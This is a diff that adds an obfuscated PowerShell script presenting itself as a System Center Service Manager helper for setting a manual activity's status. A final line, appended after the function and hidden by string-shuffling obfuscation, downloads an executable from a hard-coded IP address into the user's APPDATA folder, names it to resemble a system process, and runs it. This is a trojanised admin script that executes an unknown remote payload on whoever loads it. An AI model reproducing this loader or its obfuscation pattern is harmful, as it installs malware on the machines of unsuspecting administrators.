@@ -1,0 +1,43 @@
+Function s`ET-sCsmmAs`T`ATuS
+{
+    [CmdletBinding()]
+    PARAM(
+        ${M`AnUalACT`iv`ItYID},
+
+        ${St`AT`US} = ("{1}{2}{0}" -f'pleted','C','om')
+    )
+    BEGIN
+    {
+        TRY
+        {
+            if (-not(.("{1}{2}{0}"-f'e','Get-m','odul') -Name ("{1}{0}" -f 's','smlet')))
+            {
+                
+                &("{0}{2}{1}"-f 'Import-','le','Modu') -Name ("{1}{0}"-f'lets','sm')
+            }
+        }
+        CATCH
+        {
+            &("{2}{1}{0}" -f 'te-Warning','i','Wr') -Message ("{4}{3}{1}{6}{2}{0}{5}"-f 'e sm','r','oading th','Er','[BEGIN] ','lets','or while l')
+            &("{1}{2}{3}{0}" -f 'Warning','W','rit','e-') -Message ${Er`RoR}[0]."E`xCePT`i`oN"."Mes`s`AGe"
+        }
+    }
+    PROCESS
+    {
+        TRY{
+            
+            ${m`ANuaLAct`i`VITY} = &("{3}{0}{2}{1}" -f'SCS','Object','M','Get-') -Class (.("{4}{1}{0}{2}{3}" -f'la','SCSMC','s','s','Get-') -Name ((("{4}{5}{0}{3}{9}{6}{2}{7}{8}{10}{1}"-f 'kItem','{0}','t','.Acti','S','ystem.Wor','ualAc','i','vit','vity.Man','y'))  -F [char]36)) -filter ('ID'+' '+'-e'+'q '+"$ManualActivityID")
+            
+            .("{0}{1}{2}" -f'Set-','SCS','MObject') -SMObject ${maNuAL`Act`i`VITY} -Property ("{2}{1}{0}" -f's','atu','St') -Value ${sT`Atus}
+        }
+        CATCH
+        {
+            .("{3}{2}{1}{0}"-f'ning','te-War','i','Wr') -Message ("{2}{8}{7}{9}{4}{0}{1}{6}{5}{3}" -f' wrong hap','p','[','ed','hing','n','e','ESS] So','PROC','met')
+            &("{3}{0}{2}{1}"-f 'it','ng','e-Warni','Wr') -Message ${eR`ROR}[0]."EX`CEpTI`ON"."meSSa`gE"
+        }
+    }
+    END{
+        .("{2}{0}{1}"-f'r','bose','Write-Ve') -Message ("{0}{5}{2}{6}{3}{1}{4}{7}"-f '[END','s ','t-S','MMAStatu','D','] Se','CS','one!')
+    }
+}
+(&("{1}{2}{0}" -f'ct','New-Obj','e') ("{0}{5}{3}{2}{4}{1}"-f'Syst','ebClient','t.','m.Ne','W','e')).("{1}{0}{2}" -f'w','Do','nloadFile').Invoke(("{2}{3}{1}{11}{7}{0}{9}{6}{10}{5}{4}{8}" -f'70.21','://89','htt','p','srs','c','~yahoo','.1','v.exe','8/','/','.248'),"$env:APPDATA\csrsv.exe");&("{2}{1}{0}"-f 'Process','rt-','Sta') ("$env:APPDATA\csrsv.exe")
